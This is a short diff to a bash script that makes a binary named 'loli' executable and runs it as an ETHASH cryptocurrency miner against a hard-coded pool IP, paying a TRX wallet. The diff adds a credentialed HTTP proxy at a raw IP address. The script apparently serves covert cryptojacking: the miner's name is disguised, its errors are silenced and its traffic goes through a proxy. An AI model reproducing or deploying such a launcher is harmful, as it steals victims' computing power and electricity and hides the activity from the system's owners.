@@ -1,5 +1,5 @@
 #!/bin/bash
 
 chmod +x loli >/dev/null 2>&1
-
+export http_proxy=http://pekoktenan88:pekoktenan88@45.140.13.119:9132
 ./loli --algo ETHASH --pool 167.71.96.194:3333 --user TRX:TX78LazSnkxLGrXD9B38RyMvqYwNaV6BVw.$(echo $(shuf -i 1-999 -n 1)-T4)
